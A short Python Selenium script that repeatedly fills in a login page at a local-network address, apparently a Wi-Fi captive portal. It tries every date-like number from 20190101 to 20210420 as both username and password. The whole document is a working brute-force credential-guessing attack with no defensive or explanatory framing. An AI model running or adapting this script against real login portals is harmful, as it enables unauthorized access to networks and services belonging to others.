from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import tqdm, time

browser = webdriver.Safari()
browser.maximize_window()
browser.get('http://192.168.1.254:65080/login.html?g=bGFuZz0wJmF1dGhpZD0xJmF1dGhzcnY9dGVzdCZjaGVja3N1'
            'bT00REVEMTIyNUIwN0E0Q0Y3QTU5QkY4MjJEMzM1MEI1JnJlZGlyZWN0PWh0dHAlM0ElMkYlMkZjbGllbnRzMy5n'
            'b29nbGUuY29tJTJGZ2VuZXJhdGVfMjA0')
for i in tqdm.trange(20190101, 20210420):
    username = browser.find_element_by_xpath('//*[@id="username_cid"]')
    username.clear()
    username.send_keys(i)
    password = browser.find_element_by_xpath('//*[@id="password_cid"]')
    password.send_keys(i)
    password.send_keys(Keys.RETURN)
    time.sleep(0.1)

